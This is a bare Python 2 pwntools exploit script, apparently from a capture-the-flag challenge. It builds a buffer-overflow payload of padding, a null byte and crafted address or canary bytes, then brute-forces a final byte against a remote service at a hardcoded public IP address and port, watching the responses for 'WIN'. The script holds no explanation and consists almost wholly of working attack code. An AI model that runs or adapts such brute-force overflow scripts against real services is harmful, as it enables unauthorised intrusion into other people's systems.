from pwn import *

#payload = 'paperAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x28\xad\x28\x7c\x70\xc1\x91'
payload = 'paperAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x19\x49\x64\x11\x9d\x7d\xed'+'A'*16
#p = remote('127.0.0.1', 12345)
#print p.recv()
i = 0
while (i<=0xff):
    #p = remote('127.0.0.1', 12345)
    p = remote('34.94.161.34', 12345)
    print p.recv()
    p.send(payload+chr(i))
    print i
    a = p.recvall()
    print a
    if 'WIN' in a:
        i+=1
    #a = p.recvall()
    #print a
    p.close()
#p.send(payload)
#print p.recv()
